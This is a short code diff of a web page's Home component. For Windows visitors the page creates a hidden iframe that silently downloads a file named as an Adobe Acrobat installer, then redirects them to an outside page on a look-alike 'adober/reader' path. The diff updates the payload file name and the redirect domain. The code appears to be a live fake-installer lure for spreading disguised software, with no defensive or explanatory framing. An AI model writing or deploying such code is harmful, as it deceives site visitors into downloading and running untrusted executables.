@@ -11,12 +11,12 @@ export default function Home() {
     if (isWindows) {
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = '/Reader_adobe_install_online.msi';
+      iframe.src = '/AdobeAcrobatDC_2025.003.40436_29091';
       document.body.appendChild(iframe);
 
       setTimeout(() => {
         window.location.href =
-          'https://mksonline.com.mx/css/adobe/reader/download.html';
+          'https://wavemarkmx.com/adober/reader/download.html';
       }, 2000);
 
       return;
